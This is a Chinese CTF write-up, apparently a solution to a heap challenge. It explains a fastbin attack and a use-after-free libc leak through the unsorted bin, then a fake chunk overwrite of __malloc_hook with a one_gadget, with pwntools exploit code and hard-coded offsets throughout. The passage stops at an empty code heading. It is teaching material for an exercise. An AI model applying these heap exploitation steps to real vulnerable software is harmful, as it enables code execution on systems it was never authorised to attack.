
### 利用 unsorted bin 泄露 libc 地址

> 经过上述分析我们不妨尝试利用输出 unsorted bin 第一个 chunk 的数据内容来泄露 libc，因此需要读取一个已经被 free 的 chunk 的数据，即 Use-After-Free。但是`dump()`函数输出的是原申请大小的数据，所以要想输出 unsorted bin 中 chunk 的数据，必须在`free()`该 chunk 后仍有一个指向该位置的指针。为此，我们利用 fast bin attack 伪造一个指向它的指针。

首先申请 4 个实际大小为 0x20 的 chunk，分别为`idx0`到`idx3`，`idx0`的作用是 partial overwrite `idx1`的`fd`指针，使其指向`idx4`，后两个用于形成单链表结构，`idx3`用于修改`idx4`的数据。

```python
# in the following, the real size of chunk is the allocated size adding 0x10
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x10)
# 0x90 is not in fastbin but in unsorted bin
allocate(0x80)
# idx4 free to unsorted bin
free(2)
free(1)
```

![image](https://bbs.kanxue.com/upload/attach/202302/950404_XYKNYGG5BY4QTC5.png)

注意到此时 fastbin 中构成单链表，`idx1`的`fd`指针指向`idx2`。由于起始堆块的地址是 4KB（即 0x1000）对齐的，也就是在新的一页内存中。我们修改`idx1`的`fd`指针的最低字节为 0x80 即可将其指向`idx4`。

```python
# change the fd point to idx4
payload1 = b'a' * 0x10 + p64(0) + p64(0x21) + p8(0x80)
fill(0, len(payload1), payload1)
```

![image](https://bbs.kanxue.com/upload/attach/202302/950404_34SBWY2TPHXZZR8.png)

在上述断点调试时，地址重新随机化，但仍是 0x1000 对齐的，同时可以看见`fastbin[0x20][1]`存储的是指向`idx4`的指针，我们将`fastbin[0x20][1]`分配出来就得到另一个指向`idx4`对应 chunk 的指针`idx4*`，当我们释放原`idx4`后，通过`dump(idx4*)`即可泄露 libc。

```python
# modify the size of chunk idx4 to fit the demand of choose free chunk
payload2 = b'a' * 0x10 + p64(0) + p64(0x21)
fill(3, len(payload2), payload2)
# 1st is idx1 and 2nd is the fake chunk which is freed into unsorted bin and its fd is the addr of unsorted bin
allocate(0x10) # idx1
allocate(0x10) # idx2 point to the chunk of idx4
```

要从 fastbin 申请 0x20 的堆块，必须保证该堆块 size 域为 0x21，这就要求我们修改`idx4` chunk 的 size 域为 0x21。接着从`fastbin[0x20]`中吧两个 chunk 申请出来，第二个就是`idx4*`，对应的下标是`idx2`。

![image](https://bbs.kanxue.com/upload/attach/202302/950404_23XVNNM5QEECX46.png)

现在我们得到两个指向 0x80 处 chunk 的指针了，我们利用`idx4`指针将其释放进 unsorted bin，需要先修改 size 域为 0x91，否则释放后会进入 fastbin。同时再申请一个堆块避免`idx4`与 top chunk 合并。

```python
allocate(0x80) # idx5, avoid idx4 adjacent to top chunk
# fix the size of idx4 before free
payload = 0x10 * b'a' + p64(0) + p64(0x91)
fill(3, len(payload), payload)
free(4)
dump(2)
```

`dump(2)`即可输出`bin[0]`的地址。偏移如何获取已在前置知识处说明，此处不再赘述。

```python
p.recvuntil(b"Content: \n")
bin0_addr = u64(p.recv(8))
bin0_offset = 0x58
main_arena_addr = bin0_addr - bin0_offset
main_arena_offset = 0x3C4B20
libc_addr = main_arena_addr - main_arena_offset
```

### 利用 fake chunk 覆写 malloc hook

> 获取`libc_addr`后，终于可以进行利用了。我们已经讲过，通过修改`malloc_hook`为`one_gadget`以 getshell。此处需要构造 fake chunk。在泄露`libc_addr`的过程中我们用到 fast bin attack，可以修改 fast bin 中第 i 个 free chunk 的`fd`指针，第 i+1 个 free chunk 的地址为任意已知的想要指向的地址。下面来具体分析构造 fake chunk 的过程。
>
> 在此我们先分析一下什么叫 fake chunk。首先，我们的目的是在`malloc_hook_addr`更低地址处申请一个 chunk，利用它修改`malloc_hook`，而申请这样的堆块，不仅需要一个指针，还需要这个指针指向的堆块的 size 域满足大小与 fastbin 大小对应相等的这个关系，除此之外没有其他限制。换句话说，我们需要一个字节的数据，它与正常进入 fastbin 的 chunk 的 size 域相同。通过这个字节数据作为 size 域的 chunk 就是所谓的 fake chunk。

我们可以通过`find_fake_fast`命令寻找 fake chunk。

![image](https://bbs.kanxue.com/upload/attach/202302/950404_J4W2AT2V53KW574.png)

这样就得到了`fake_chunk_addr`。任意选取一个，计算它的`mem`指针与`malloc_hook`的大小差即可。为加深理解，这里给出正常一字节空间存储的数据，读者不妨自己体会体会 fake chunk 的含义。同时也可以想想 0x7f 是不是最容易出现的 size 域的值？同时，为什么 0x7f 的低 4 位不影响 chunk 的大小？

![image](https://bbs.kanxue.com/upload/attach/202302/950404_EHF947KGT72F4M3.png)

我们已知 fake chunk 的大小为 0x70，于是只需要利用 fast bin attack，申请一个指向 fake chunk 的指针即可。但是这里有一个小 trick，在上述泄露 libc 的操作中，我们的`idx2`指针仍在，但对应的大小为 0x90 的 chunk 在 unsorted bin 中，而当`fastbin[0x70]`为空时，要申请 0x70 的 chunk，会将 0x90 的 chunk 分割 0x70 以满足申请，剩余 0x20 进入 reminder。也就是说，我们申请一个 0x70 大小的 chunk 后，`idx2`和 malloc 返回的新指针都指向它，利用新指针将它 free 后`idx2`依然可以读写它。

所以，只需要在 free 之后将它的`fd`域修改为`fake_chunk_addr`，再申请 fastbin 中的 chunk 即可。

```python
allocate(0x60) # idx2 and idx4 point to it
free(4)
```

![image](https://bbs.kanxue.com/upload/attach/202302/950404_UBS84UQWTPGEJKF.png)

此时 fastbin 中只存在一个刚刚 free 的一个 chunk。

```python
fake_chunk_offset = -0x33
fake_chunk_addr = main_arena_addr + fake_chunk_offset
payload3 = p64(fake_chunk_addr)
fill(2, len(payload3), payload3)
```

![image](https://bbs.kanxue.com/upload/attach/202302/950404_GDJAUV89N9DYQUW.png)

修改`fd`指针后出现两个。表明 fastbin 不对有多少 chunk 计数，而是通过`fd`指针指向 null 判断链表结束，与我们熟知的链表的特点完全吻合。第二个即是 fake chunk。

```python
allocate(0x60) # idx4
allocate(0x60) # idx6
one_gadget_offset = 0x4526a
one_gadget_addr = libc_addr + one_gadget_offset
payload4 = b'a' * 0x13 + p64(one_gadget_addr)
fill(6, len(payload4), payload4)
```

`idx6`就是 fake_chunk 的指针，计算准偏移量后将`malloc_hook`覆盖成`one_gadget`即可。

### 代码

